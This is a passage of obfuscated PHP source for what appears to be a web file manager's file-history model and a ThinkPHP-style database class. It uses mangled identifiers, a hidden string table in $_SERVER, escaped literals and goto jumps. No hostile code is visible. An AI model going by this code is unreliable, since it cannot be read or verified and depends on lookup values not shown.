addHistory($ØíªË³Ã, $·±ÉÖ¹Ì = '') { $‚Î…Â¿ =& $_SERVER[ˆö¿ÚÌ¼]; $ñÁÇ£ƒû = array($‚Î…Â¿[503] => $ØíªË³Ã[$‚Î…Â¿[194]], $‚Î…Â¿[1776] => isset($ØíªË³Ã[$‚Î…Â¿[541]]) ? $ØíªË³Ã[$‚Î…Â¿[541]] : $ØíªË³Ã[$‚Î…Â¿[539]], $‚Î…Â¿[556] => $ØíªË³Ã[$‚Î…Â¿[555]], $‚Î…Â¿[634] => $ØíªË³Ã[$‚Î…Â¿[79]], $‚Î…Â¿[2241] => $·±ÉÖ¹Ì); if ($GLOBALS[$‚Î…Â¿[6]][$‚Î…Â¿[92]][$‚Î…Â¿[1316]] >= 1) { $this->historyAutoClear($ñÁÇ£ƒû[$‚Î…Â¿[194]]); $this->add($ñÁÇ£ƒû); } Hook::trigger($‚Î…Â¿[2242], $ñÁÇ£ƒû); Model($‚Î…Â¿[2243])->eventFileEdit($ØíªË³Ã[$‚Î…Â¿[194]]); } private function historyAutoClear($ĞÎœ‚½ ) { $¼®ë ª„ =& $_SERVER[ˆö¿ÚÌ¼]; $ô¤ÙÁëÚ = Model($¼®ë ª„[855])->get($¼®ë ª„[1338]); $šàªÍ = intval($GLOBALS[$¼®ë ª„[6]][$¼®ë ª„[92]][$¼®ë ª„[1316]]); $ö’ïïÙ = $ô¤ÙÁëÚ == $¼®ë ª„[1339] ? min(5, $šàªÍ) : $šàªÍ; $ö’ïïÙ = $ö’ïïÙ <= 0 ? 0 : $ö’ïïÙ - 1; if ($ö’ïïÙ >= 499) { return; } $ŸõÔ†ƒ¬ = array($¼®ë ª„[503] => $ĞÎœ‚½ ); $×ÕÀöæ€ = $this->field($¼®ë ª„[2244])->where($ŸõÔ†ƒ¬)->order($¼®ë ª„[2237])->select(); if (!$×ÕÀöæ€ || $ö’ïïÙ >= count($×ÕÀöæ€)) { return; } $åÌ€ğá• = array_to_keyvalue($×ÕÀöæ€, $¼®ë ª„[12], $¼®ë ª„[478]); $åÌ€ğá• = array_slice($åÌ€ğá•, $ö’ïïÙ); $µÜ×¾ÜÓ = array_to_keyvalue($×ÕÀöæ€, $¼®ë ª„[12], $¼®ë ª„[555]); $µÜ×¾ÜÓ = array_slice($µÜ×¾ÜÓ, $ö’ïïÙ); if (!$åÌ€ğá• || !$µÜ×¾ÜÓ) { return; } $ŸõÔ†ƒ¬ = array($¼®ë ª„[505] => array($¼®ë ª„[7], $åÌ€ğá•)); $this->where($ŸõÔ†ƒ¬)->delete(); Model($¼®ë ª„[558])->remove($µÜ×¾ÜÓ); } public function listData($èÔ½í±Ë) { $îÒ„íÀ =& $_SERVER[ˆö¿ÚÌ¼]; $Ìç£«†ø = array($îÒ„íÀ[503] => $èÔ½í±Ë); $ÌÒØ£Ö = $îÒ„íÀ[2245]; $ù»–û¾É = $this->field($ÌÒØ£Ö)->where($Ìç£«†ø)->order($îÒ„íÀ[2237])->selectPage(); $this->_listAppendUser($ù»–û¾É[$îÒ„íÀ[448]]); $çŒ ‘Ã¤ = Model($îÒ„íÀ[855])->get($îÒ„íÀ[1338]); $ŠÛıÉË· = 5; if ($çŒ ‘Ã¤ == $îÒ„íÀ[1339]) { $ù»–û¾É[$îÒ„íÀ[448]] = array_slice($ù»–û¾É[$îÒ„íÀ[448]], 0, $ŠÛıÉË·); $ù»–û¾É[$îÒ„íÀ[445]] = array($îÒ„íÀ[2246] => 1, $îÒ„íÀ[2247] => 20, $îÒ„íÀ[2248] => 1, $îÒ„íÀ[2249] => count($ù»–û¾É[$îÒ„íÀ[448]])); } return $ù»–û¾É; } protected function _listAppendUser(&$…íÈµ€Ó) { $¸ƒÜÙÉß =& $_SERVER[ˆö¿ÚÌ¼]; $Á­Áª = array_to_keyvalue($…íÈµ€Ó, $¸ƒÜÙÉß[12], $¸ƒÜÙÉß[1785]); $·ˆ¨†ÙË = Model($¸ƒÜÙÉß[611])->userListInfo($Á­Áª); foreach ($…íÈµ€Ó as &$œ­˜‘ˆ·) { $¹şÏœ²´ = $œ­˜‘ˆ·[$¸ƒÜÙÉß[1785]]; $œ­˜‘ˆ·[$¸ƒÜÙÉß[539]] = $·ˆ¨†ÙË[$¹şÏœ²´] ? $·ˆ¨†ÙË[$¹şÏœ²´] : !1; } unset($œ­˜‘ˆ·); } public function fileInfo($˜›Šşä, $è¼ÃÄÜ§ = false) { $¢è¼Ÿ´­ =& $_SERVER[ˆö¿ÚÌ¼]; $ó’²şàõ = $this->tablePrefix; $éÇ¾¹˜ë = "{$ó’²şàõ}\151\157\x5f\x66\151\154\x65\40\x66\151\x6c\x65\163\x20\157\x6e\x20\146\x69\154\x65\x73\x2e\146\151\154\x65\x49\x44\x20\75\x20\x68\151\163\x74\157\162\171\x2e\x66\x69\x6c\145\x49\104"; $˜“–¦€¥ = $this->alias($¢è¼Ÿ´­[2250])->where(array($¢è¼Ÿ´­[505] => $˜›Šşä))->join($éÇ¾¹˜ë, $¢è¼Ÿ´­[2251])->find(); if ($˜“–¦€¥ && $è¼ÃÄÜ§) { $Ëëíˆä = array($¢è¼Ÿ´­[194] => $˜“–¦€¥[$¢è¼Ÿ´­[194]], $¢è¼Ÿ´­[478] => array($¢è¼Ÿ´­[1104], $˜›Šşä)); $˜“–¦€¥[$¢è¼Ÿ´­[1672]] = $this->where($Ëëíˆä)->count(); } return $˜“–¦€¥; } public function removeItem($ÙƒÂâ¡Ÿ) { $ŠÖ†–Æ =& $_SERVER[ˆö¿ÚÌ¼]; $ƒş„ƒüÉ = array($ŠÖ†–Æ[505] => $ÙƒÂâ¡Ÿ); $ï›÷ØÚ = $this->where($ƒş„ƒüÉ)->find(); if ($ï›÷ØÚ) { $ĞĞ¯ï½ù = $this->where($ƒş„ƒüÉ)->delete(); Model($ŠÖ†–Æ[558])->remove($ï›÷ØÚ[$ŠÖ†–Æ[555]]); return $ĞĞ¯ï½ù; } return !1; } public function removeBySource($›Ş¼òì) { $¬½ù¥ŠŞ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$›Ş¼òì) { return !1; } if (!is_array($›Ş¼òì)) { $›Ş¼òì = array($›Ş¼òì); } $úîìûå = array($¬½ù¥ŠŞ[503] => array($¬½ù¥ŠŞ[7], $›Ş¼òì)); $ä¼ïÄ€ = $this->field($¬½ù¥ŠŞ[556])->where($úîìûå)->select(); if ($ä¼ïÄ€) { $this->where($úîìûå)->delete(); $üöòÕ = array_to_keyvalue($ä¼ïÄ€, $¬½ù¥ŠŞ[12], $¬½ù¥ŠŞ[555]); Model($¬½ù¥ŠŞ[558])->remove($üöòÕ); } return !0; } public function setDetail($©”ÏÎÁ°, $‹õÙ­˜¸) { $ìçØâ =& $_SERVER[ˆö¿ÚÌ¼]; return $this->where(array($ìçØâ[505] => $©”ÏÎÁ°))->save(array($ìçØâ[2241] => $‹õÙ­˜¸)); } public function rollbackToItem($·ŞõóÙˆ, $Õøô§Ÿ) { $Š‘ˆ‰õ³ =& $_SERVER[ˆö¿ÚÌ¼]; $õ¤Ğ‚à = Model($Š‘ˆ‰õ³[915])->sourceInfo($·ŞõóÙˆ); $this->addHistory($õ¤Ğ‚à, LNG($Š‘ˆ‰õ³[2252])); $¿«Û£øæ = $this->find($Õøô§Ÿ); $”ü½’éñ = array($Š‘ˆ‰õ³[555] => $¿«Û£øæ[$Š‘ˆ‰õ³[555]], $Š‘ˆ‰õ³[79] => $¿«Û£øæ[$Š‘ˆ‰õ³[79]], $Š‘ˆ‰õ³[88] => time(), $Š‘ˆ‰õ³[541] => USER_ID); Model($Š‘ˆ‰õ³[915])->where(array($Š‘ˆ‰õ³[194] => $·ŞõóÙˆ))->save($”ü½’éñ); return $this->where(array($Š‘ˆ‰õ³[505] => $Õøô§Ÿ))->delete(); } public function clearSame($ûŒúóò) { $ú»‹„‰ =& $_SERVER[ˆö¿ÚÌ¼]; $„ïâå‡® = $this->listData($ûŒúóò); $©¡Óëà = array_to_keyvalue_group($„ïâå‡®, $ú»‹„‰[555]); $·êÇ¨½Ä = array(); $ÕßòƒÓæ = array(); foreach ($©¡Óëà as $ã‘«¶îÛ) { if (!$ã‘«¶îÛ || count($ã‘«¶îÛ) <= 1) { continue; } foreach ($ã‘«¶îÛ as $ú›±ÄÑ¤) { $·êÇ¨½Ä[] = $ú›±ÄÑ¤[$ú»‹„‰[555]]; $ÕßòƒÓæ[] = $ú›±ÄÑ¤[$ú»‹„‰[478]]; } } if (!$ÕßòƒÓæ) { return; } $this->where(array($ú»‹„‰[478] => array($ú»‹„‰[7], $ÕßòƒÓæ)))->delete(); Model($ú»‹„‰[558])->remove($·êÇ¨½Ä); } public function userSpace() { $’ºÈĞÜÌ =& $_SERVER[ˆö¿ÚÌ¼]; $–åãÎ—¾ = $this->tablePrefix; $•ö¨ôéŠ = array($’ºÈĞÜÌ[1776] => USER_ID); $ŞĞôÉãÉ = "{$–åãÎ—¾}\151\157\137\146\x69\x6c\x65\40\x66\151\x6c\x65\163\x20\x6f\x6e\40\146\151\x6c\x65\x73\x2e\146\151\x6c\145\x49\104\40\x3d\x20\x68\151\x73\164\157\x72\171\x2e\x66\x69\x6c\145\111\x44"; return $this->alias($’ºÈĞÜÌ[2250])->where($•ö¨ôéŠ)->join($ŞĞôÉãÉ, $’ºÈĞÜÌ[2251])->sum($’ºÈĞÜÌ[79]); } } goto fß„“˜ŸïÉ; e¢­ÛãÉŞ: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\151\156\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\x6e\145\x71" => "\x3c\x3e", "\147\164" => "\76", "\145\147\x74" => "\76\75", "\x6c\x74" => "\74", "\x65\x6c\x74" => "\74\x3d", "\156\157\164\x6c\151\x6b\145" => "\116\x4f\x54\40\x4c\x49\113\105", "\154\151\x6b\x65" => "\114\x49\113\105", "\151\156" => "\x49\116", "\156\157\164\x69\x6e" => "\x4e\x4f\x54\x20\x49\x4e", "\156\x6f\x74\40\151\x6e" => "\x4e\117\124\x20\x49\x4e", "\x62\145\164\x77\145\x65\x6e" => "\x42\105\124\127\105\x45\116", "\156\157\164\142\x65\x74\x77\x65\x65\156" => "\116\117\124\x20\102\x45\124\x57\x45\x45\x4e", "\156\157\164\40\x62\145\x74\x77\145\x65\x6e" => "\116\117\124\40\x42\105\124\x57\105\105\116"); protected $selectSql = "\123\x45\114\105\x43\124\x25\x44\111\123\x54\111\x4e\103\x54\45\40\45\x46\111\x45\x4c\104\45\40\106\x52\117\x4d\x20\45\x54\101\102\x4c\105\45\x25\112\x4f\111\x4e\x25\45\x57\x48\x45\122\105\45\45\x47\122\x4f\125\x50\x25\45\x48\101\x56\111\x4e\107\x25\x25\x4f\122\x44\105\122\x25\x25\114\x49\x4d\111\124\x25\40\x25\125\116\111\117\116\45\45\x43\x4f\115\x4d\105\116\124\x25"; protected $bind = array(); public static function getInstance() { $³¡·¹€¤ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ˆö¿ÚÌ¼][1051], $³¡·¹€¤); } public function factory($·³î Äø = '') { $ôÁÎ™ÓŒ =& $_SERVER[ˆö¿ÚÌ¼]; $·³î Äø = $this->parseConfig($·³î Äø); if (empty($·³î Äø[$ôÁÎ™ÓŒ[1052]])) { think_exception(think_lang($ôÁÎ™ÓŒ[1053])); } $this->dbType = ucwords(strtolower($·³î Äø[$ôÁÎ™ÓŒ[1052]])); $Äç×× = $ôÁÎ™ÓŒ[1054] . $this->dbType; if (class_exists($Äç××)) { $æ® ¸ = new $Äç××($·³î Äø); if ($ôÁÎ™ÓŒ[1055] != strtolower($·³î Äø[$ôÁÎ™ÓŒ[1052]])) { $æ® ¸->dbType = strtoupper($this->dbType); } else { $æ® ¸->dbType = $this->_getDsnType($·³î Äø[$ôÁÎ™ÓŒ[1007]]); } } else { think_exception(think_lang($ôÁÎ™ÓŒ[1056]) . $ôÁÎ™ÓŒ[1057] . $Äç××); } return $æ® ¸; } public function __call($çÜúƒÄÍ, $ê˜İ±¦) { if (method_exists($this, $çÜúƒÄÍ)) { return call_user_func_array(array($this, $çÜúƒÄÍ), $ê˜İ±¦); } } protected function _getDsnType($í¬ã• ) { $İ©ù”å¶ = explode($_SERVER[ˆö¿ÚÌ¼][4], $í¬ã• ); $Š¢çºåÅ = strtoupper(trim($İ©ù”å¶[0])); return $Š¢çºåÅ; } private function parseConfig($ª’ï¶Æè = '') { $½äŸÔûÌ =& $_SERVER[ˆö¿ÚÌ¼]; if (!empty($ª’ï¶Æè) && is_string($ª’ï¶Æè)) { $ª’ï¶Æè = $this->parseDSN($ª’ï¶Æè); } elseif (is_array($ª’ï¶Æè)) { $ª’ï¶Æè = array_change_key_case($ª’ï¶Æè); $ª’ï¶Æè = array($½äŸÔûÌ[1052] => $ª’ï¶Æè[$½äŸÔûÌ[1058]], $½äŸÔûÌ[979] => $ª’ï¶Æè[$½äŸÔûÌ[1059]], $½äŸÔûÌ[980] => $ª’ï¶Æè[$½äŸÔûÌ[1060]], $½äŸÔûÌ[977] => $ª’ï¶Æè[$½äŸÔûÌ[1061]], $½äŸÔûÌ[978] => $ª’ï¶Æè[$½äŸÔûÌ[1062]], $½äŸÔûÌ[21] => $ª’ï¶Æè[$½äŸÔûÌ[1063]], $½äŸÔûÌ[1007] => $ª’ï¶Æè[$½äŸÔûÌ[1064]], $½äŸÔûÌ[17] => isset($ª’ï¶Æè[$½äŸÔûÌ[1065]]) ? $ª’ï¶Æè[$½äŸÔûÌ[1065]] : array()); } elseif (empty($ª’ï¶Æè)) { if (think_config($½äŸÔûÌ[1066]) && $½äŸÔûÌ[1055] != strtolower(think_config($½äŸÔûÌ[1067]))) { $ª’ï¶Æè = $this->parseDSN(think_config($½äŸÔûÌ[1066])); } else { $ª’ï¶Æè = array($½äŸÔûÌ[1052] => think_config($½äŸÔûÌ[1067]), $½äŸÔûÌ[979] => think_config($½äŸÔûÌ[1068]), $½äŸÔûÌ[980] => think_config($½äŸÔûÌ[1069]), $½äŸÔûÌ[977] => think_config($½äŸÔûÌ[1070]), $½äŸÔûÌ[978] => think_config($½äŸÔûÌ[1071]), $½äŸÔûÌ[21] => think_config($½äŸÔûÌ[326]), $½äŸÔûÌ[1007] => think_config($½äŸÔûÌ[1066]), $½äŸÔûÌ[17] => think_config($½äŸÔûÌ[1072])); } } return $ª’ï¶Æè; } protected function initConnect($†Œš˜”È = true) { if (1 == think_config($_SERVER[ˆö¿ÚÌ¼][22])) { $this->_linkID = $this->multiConnect($†Œš˜”È); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $Š“Ş”Å× => $ŞÊÛ¨çä) { $this->_linkID = $ŞÊÛ¨çä; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($Ïªñ‹ê‹ = false) { $ŒİŠû¹¤ =& $_SERVER[ˆö¿ÚÌ¼]; static $üÎÚÉ¶ = array(); static $«­ÒŞ ñ = -1; if (empty($üÎÚÉ¶)) { foreach ($this->config as $óç¡Íæ => $“Éı²) { $üÎÚÉ¶[$óç¡Íæ] = explode($ŒİŠû¹¤[50], $“Éı²); } } if (think_config($ŒİŠû¹¤[1073])) { if ($Ïªñ‹ê‹ || think_config($ŒİŠû¹¤[474]) === !0) { $°Õ“¨²— = floor(mt_rand(0, think_config($ŒİŠû¹¤[1074]) - 1)); $«­ÒŞ ñ = $°Õ“¨²—; } else { if (is_numeric(think_config($ŒİŠû¹¤[1075]))) { $°Õ“¨²— = think_config($ŒİŠû¹¤[1075]); } else { $°Õ“¨²— = floor(mt_rand(think_config($ŒİŠû¹¤[1074]), count($üÎÚÉ¶[$ŒİŠû¹¤[977]]) - 1)); } } } else { $°Õ“¨²— = floor(mt_rand(0, count($üÎÚÉ¶[$ŒİŠû¹¤[977]]) - 1)); $«­ÒŞ ñ = $°Õ“¨²—; } $°Õ“¨²— = $«­ÒŞ ñ !== -1 ? $«­ÒŞ ñ : $°Õ“¨²—; $±€êğ¢¥ = array($ŒİŠû¹¤[979] => isset($üÎÚÉ¶[$ŒİŠû¹¤[979]][$°Õ“¨²—]) ? $üÎÚÉ¶[$ŒİŠû¹¤[979]][$°Õ“¨²—] : $üÎÚÉ¶[$ŒİŠû¹¤[979]][0], $ŒİŠû¹¤[980] => isset($üÎÚÉ¶[$ŒİŠû¹¤[980]][$°Õ“¨²—]) ? $üÎÚÉ¶[$ŒİŠû¹¤[980]][$°Õ“¨²—] : $üÎÚÉ¶[$ŒİŠû¹¤[980]][0], $ŒİŠû¹¤[977] => isset($üÎÚÉ¶[$ŒİŠû¹¤[977]][$°Õ“¨²—]) ? $üÎÚÉ¶[$ŒİŠû¹¤[977]][$°Õ“¨²—] : $üÎÚÉ¶[$ŒİŠû¹¤[977]][0], $ŒİŠû¹¤[978] => isset($üÎÚÉ¶[$ŒİŠû¹¤[978]][$°Õ“¨²—]) ? $üÎÚÉ¶[$ŒİŠû¹¤[978]][$°Õ“¨²—] : $üÎÚÉ¶[$ŒİŠû¹¤[978]][0], $ŒİŠû¹¤[21] => isset($üÎÚÉ¶[$ŒİŠû¹¤[21]][$°Õ“¨²—]) ? $üÎÚÉ¶[$ŒİŠû¹¤[21]][$°Õ“¨²—] : $üÎÚÉ¶[$ŒİŠû¹¤[21]][0], $ŒİŠû¹¤[1007] => isset($üÎÚÉ¶[$ŒİŠû¹¤[1007]][$°Õ“¨²—]) ? $üÎÚÉ¶[$ŒİŠû¹¤[1007]][$°Õ“¨²—] : $üÎÚÉ¶[$ŒİŠû¹¤[1007]][0], $ŒİŠû¹¤[17] => isset($üÎÚÉ¶[$ŒİŠû¹¤[17]][$°Õ“¨²—]) ? $üÎÚÉ¶[$ŒİŠû¹¤[17]][$°Õ“¨²—] : $üÎÚÉ¶[$ŒİŠû¹¤[17]][0]); return $this->connect($±€êğ¢¥, $°Õ“¨²—); } public function parseDSN($â•…±Ã) { $Á™Ñ­¿ı =& $_SERVER[ˆö¿ÚÌ¼]; if (empty($â•…±Ã)) { return !1; } $¤æŠÖµ = parse_url($â•…±Ã); if ($¤æŠÖµ[$Á™Ñ­¿ı[208]]) { $ß¡Ğ²¤å = array($Á™Ñ­¿ı[1052] => $¤æŠÖµ[$Á™Ñ­¿ı[208]], $Á™Ñ­¿ı[979] => isset($¤æŠÖµ[$Á™Ñ­¿ı[679]]) ? $¤æŠÖµ[$Á™Ñ­¿ı[679]] : $Á™Ñ­¿ı[12], $Á™Ñ­¿ı[980] => isset($¤æŠÖµ[$Á™Ñ­¿ı[1076]]) ? $¤æŠÖµ[$Á™Ñ­¿ı[1076]] : $Á™Ñ­¿ı[12], $Á™Ñ­¿ı[977] => isset($¤æŠÖµ[$Á™Ñ­¿ı[209]]) ? $¤æŠÖµ[$Á™Ñ­¿ı[209]] : $Á™Ñ­¿ı[12], $Á™Ñ­¿ı[978] => isset($¤æŠÖµ[$Á™Ñ­¿ı[210]]) ? $¤æŠÖµ[$Á™Ñ­¿ı[210]] : $Á™Ñ­¿ı[12], $Á™Ñ­¿ı[21] => isset($¤æŠÖµ[$Á™Ñ­¿ı[87]]) ? substr($¤æŠÖµ[$Á™Ñ­¿ı[87]], 1) : $Á™Ñ­¿ı[12]); } else { preg_match($Á™Ñ­¿ı[1077], trim($â•…±Ã), $¿½‘²ç§); $ß¡Ğ²¤å = array($Á™Ñ­¿ı[1052] => $¿½‘²ç§[1], $Á™Ñ­¿ı[979] => $¿½‘²ç§[2], $Á™Ñ­¿ı[980] => $¿½‘²ç§[3], $Á™Ñ­¿ı[977] => $¿½‘²ç§[4], $Á™Ñ­¿ı[978] => $¿½‘²ç§[5], $Á™Ñ­¿ı[21] => $¿½‘²ç§[6]); } $ß¡Ğ²¤å[$Á™Ñ­¿ı[1007]] = $Á™Ñ­¿ı[12]; return $ß¡Ğ²¤å; } protected function debug() { $€º“Ğ…Ä =& $_SERVER[ˆö¿ÚÌ¼]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $€º“Ğ…Ä[1078]; if (think_config($€º“Ğ…Ä[1079])) { think_status($€º“Ğ…Ä[1080]); think_trace($this->queryStr . $€º“Ğ…Ä[1081] . think_status($€º“Ğ…Ä[24], $€º“Ğ…Ä[1080], 6) . $€º“Ğ…Ä[1082], $€º“Ğ…Ä[12], $€º“Ğ…Ä[1083]); } } protected function parseLock($µ‚ ½´õ = false) { $ÓÇ˜ŠÜğ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$µ‚ ½´õ) { return $ÓÇ˜ŠÜğ[12]; } if ($ÓÇ˜ŠÜğ[1009] == $this->dbType) { return $ÓÇ˜ŠÜğ[1084]; } return $ÓÇ˜ŠÜğ[1085]; } protected function parseSet($‘½ŸÓù­) { $ÈÕù¾È =& $_SERVER[ˆö¿ÚÌ¼]; foreach ($‘½ŸÓù­ as $ÊÑ×“‘¦ => $–¤ÛÙÃå) { if (is_array($–¤ÛÙÃå) && $ÈÕù¾È[375] == $–¤ÛÙÃå[0]) { $½Ãå½í×[] = $this->parseKey($ÊÑ×“‘¦) . $ÈÕù¾È[518] . $–¤ÛÙÃå[1]; } elseif (is_scalar($–¤ÛÙÃå) || is_null($–¤ÛÙÃå)) { $½Ãå½í×[] = $this->parseKey($ÊÑ×“‘¦) . $ÈÕù¾È[518] . $this->parseValue($–¤ÛÙÃå); } } return $ÈÕù¾È[1086] . implode($ÈÕù¾È[50], $½Ãå½í×); } protected function bindParam($î—ñ®¥, $¥‘Äåƒ±) { $this->bind[$_SERVER[ˆö¿ÚÌ¼][4] . $î—ñ®¥] = $¥‘Äåƒ±; } protected function parseBind($½ã¦°±) { $½ã¦°± = array_merge($this->bind, $½ã¦°±); $this->bind = array(); return $½ã¦°±; } function parseKey(&$€™‘„øü, $°´¯›÷ß = true) { if ($°´¯›÷ß) { $€™‘„øü = $this->parseKeyCheck($€™‘„øü); } return $€™‘„øü; } function parseKeyCheck($úÓË¤³ë) { $±öé‡º =& $_SERVER[ˆö¿ÚÌ¼]; $úÓË¤³ë = trim($úÓË¤³ë); if (!preg_match($±öé‡º[1087], $úÓË¤³ë)) { think_exception($±öé‡º[1088] . $úÓË¤³ë); } return $úÓË¤³ë; } protected function parseValue($È¹¹îÁÇ) { $çöï¶¡™ =& $_SERVER[ˆö¿ÚÌ¼]; if (is_string($È¹¹îÁÇ)) { $È¹¹îÁÇ = $çöï¶¡™[1048] . $this->escapeString($È¹¹îÁÇ) . $çöï¶¡™[1048]; } elseif (isset($È¹¹îÁÇ[0]) && is_string($È¹¹îÁÇ[0]) && strtolower($È¹¹îÁÇ[0]) == $çöï¶¡™[375]) { $È¹¹îÁÇ = $this->escapeString($È¹¹îÁÇ[1]); } elseif (is_array($È¹¹îÁÇ)) { $È¹¹îÁÇ = array_map(array($this, $çöï¶¡™[1049]), $È¹¹îÁÇ); } elseif (is_bool($È¹¹îÁÇ)) { $È¹¹îÁÇ = $È¹¹îÁÇ ? $çöï¶¡™[91] : $çöï¶¡™[231]; } elseif (is_null($È¹¹îÁÇ)) { $È¹¹îÁÇ = $çöï¶¡™[106]; } return $È¹¹îÁÇ; } protected function parseField($€Ûó¨‘) { $ûµİ÷Û¨ =& $_SERVER[ˆö¿ÚÌ¼]; if (is_string($€Ûó¨‘) && strpos($€Ûó¨‘, $ûµİ÷Û¨[50])) { $€Ûó¨‘ = explode($ûµİ÷Û¨[50], $€Ûó¨‘); } if (is_array($€Ûó¨‘)) { $„Š‹À¼ù = array(); foreach ($€Ûó¨‘ as $À¼²úóÒ => $ûè‘ÑóÜ) { if (!is_numeric($À¼²úóÒ)) { $„Š‹À¼ù[] = $this->parseKey($À¼²úóÒ, !1) . $ûµİ÷Û¨[1089] . $this->parseKey($ûè‘ÑóÜ); } else { $„Š‹À¼ù[] = $this->parseKey($ûè‘ÑóÜ); } } $ğ»æéğÄ = implode($ûµİ÷Û¨[50], $„Š‹À¼ù); } elseif (is_string($€Ûó¨‘) && !empty($€Ûó¨‘)) { $ğ»æéğÄ = $€Ûó¨‘; } else { $ğ»æéğÄ = $ûµİ÷Û¨[223]; } return $ğ»æéğÄ; } protected function parseTable($ô‰¼ŞİË) { $—Ğ¼Ä·„ =& $_SERVER[ˆö¿ÚÌ¼]; if (is_array($ô‰¼ŞİË)) { $ç†»›ãé = array(); foreach ($ô‰¼ŞİË as $ùÁãâ‚Â => $åÄ¦ŞÑµ) { if (!is_numeric($ùÁãâ‚Â)) { $ç†»›ãé[] = $this->parseKey($ùÁãâ‚Â) . $—Ğ¼Ä·„[53] . $this->parseKey($åÄ¦ŞÑµ); } else { $ç†»›ãé[] = $this->parseKey($ùÁãâ‚Â); } } $ô‰¼ŞİË = $ç†»›ãé; } elseif (is_string($ô‰¼ŞİË)) { if (strstr($ô‰¼ŞİË, $—Ğ¼Ä·„[53])) { return $ô‰¼ŞİË; } $ô‰¼ŞİË = explode($—Ğ¼Ä·„[50], $ô‰¼ŞİË); array_walk($ô‰¼ŞİË, array($this, $—Ğ¼Ä·„[997])); } return $—Ğ¼Ä·„[991] . trim(implode($—Ğ¼Ä·„[1090], $ô‰¼ŞİË), $—Ğ¼Ä·„[464]) . $—Ğ¼Ä·„[991]; } protected function parseWhere($ãš’â¬) { $ºÊ¢„Œ¬ =& $_SERVER[ˆö¿ÚÌ¼]; $ ™îéúÇ = $ºÊ¢„Œ¬[12]; if (is_string($ãš’â¬)) { $ ™îéúÇ = $ãš’â¬; } else { $ñ“åƒë = isset($ãš’â¬[$ºÊ¢„Œ¬[1091]]) ? strtoupper($ãš’â¬[$ºÊ¢„Œ¬[1091]]) : $ºÊ¢„Œ¬[12]; if (in_array($ñ“åƒë, array($ºÊ¢„Œ¬[1092], $ºÊ¢„Œ¬[1093], $ºÊ¢„Œ¬[1094]))) { $ñ“åƒë = $ºÊ¢„Œ¬[53] . $ñ“åƒë . $ºÊ¢„Œ¬[53]; unset($ãš’â¬[$ºÊ¢„Œ¬[1091]]); } else { $ñ“åƒë = $ºÊ¢„Œ¬[1095]; } foreach ($ãš’â¬ as $¼÷æú‘Ô => $Ÿˆ·®Õä) { $ ™îéúÇ .= $ºÊ¢„Œ¬[357]; if (is_numeric($¼÷æú‘Ô)) { $¼÷æú‘Ô = $ºÊ¢„Œ¬[1096]; } if (0 === strpos($¼÷æú‘Ô, $ºÊ¢„Œ¬[11])) { $ ™îéúÇ .= $this->parseThinkWhere($¼÷æú‘Ô, $Ÿˆ·®Õä); } else { if (!preg_match($ºÊ¢„Œ¬[1097], trim($¼÷æú‘Ô))) { think_exception(think_lang($ºÊ¢„Œ¬[1098]) . $ºÊ¢„Œ¬[4] . $¼÷æú‘Ô); } $İô¤‹‡ = is_array($Ÿˆ·®Õä) && isset($Ÿˆ·®Õä[$ºÊ¢„Œ¬[1099]]); $¼÷æú‘Ô = trim($¼÷æú‘Ô); if (strpos($¼÷æú‘Ô, $ºÊ¢„Œ¬[215])) { $ó…ü¥« = explode($ºÊ¢„Œ¬[215], $¼÷æú‘Ô); $ÓÑÚ¤š = array(); foreach ($ó…ü¥« as $¶ˆºÜø¿ => $éÜÌÁ±¡) { $åŸ­ÊÀ = $İô¤‹‡ ? $Ÿˆ·®Õä[$¶ˆºÜø¿] : $Ÿˆ·®Õä; $ÓÑÚ¤š[] = $ºÊ¢„Œ¬[340] . $this->parseWhereItem($this->parseKey($éÜÌÁ±¡), $åŸ­ÊÀ) . $ºÊ¢„Œ¬[996]; } $ ™îéúÇ .= implode($ºÊ¢„Œ¬[1100], $ÓÑÚ¤š); } elseif (strpos($¼÷æú‘Ô, $ºÊ¢„Œ¬[287])) { $ó…ü¥« = explode($ºÊ¢„Œ¬[287], $¼÷æú‘Ô); $ÓÑÚ¤š = array(); foreach ($ó…ü¥« as $¶ˆºÜø¿ => $éÜÌÁ±¡) { $åŸ­ÊÀ = $İô¤‹‡ ? $Ÿˆ·®Õä[$¶ˆºÜø¿] : $Ÿˆ·®Õä; $ÓÑÚ¤š[] = $ºÊ¢„Œ¬[340] . $this->parseWhereItem($this->parseKey($éÜÌÁ±¡), $åŸ­ÊÀ) . $ºÊ¢„Œ¬[996]; } $ ™îéúÇ .= implode($ºÊ¢„Œ¬[1095], $ÓÑÚ¤š); } else { $ ™îéúÇ .= $this->parseWhereItem($this->parseKey($¼÷æú‘Ô), $Ÿˆ·®Õä); } } $ ™îéúÇ .= $ºÊ¢„Œ¬[358] . $ñ“åƒë; } $ ™îéúÇ = substr($ ™îéúÇ, 0, -strlen($ñ“åƒë)); } return empty($ ™îéúÇ) ? $ºÊ¢„Œ¬[12] : $ºÊ¢„Œ¬[1101] . $ ™îéúÇ; } protected function parseWhereItem($Œ§¯›, $¯é–ºÔ†) { $ããĞãµÄ =& $_SERVER[ˆö¿ÚÌ¼]; $•ÄÒ—Ç = $ããĞãµÄ[12]; if (is_array($¯é–ºÔ†)) { if (is_string($¯é–ºÔ†[0])) { $Ï’şíÀÂ = strtolower($¯é–ºÔ†[0]); if (in_array($¯é–ºÔ†[0], array($ããĞãµÄ[518], $ããĞãµÄ[1102], $ããĞãµÄ[1103], $ããĞãµÄ[1104], $ããĞãµÄ[1105], $ããĞãµÄ[1106]))) { $•ÄÒ—Ç .= $Œ§¯› . $ããĞãµÄ[53] . $¯é–ºÔ†[0] . $ããĞãµÄ[53] 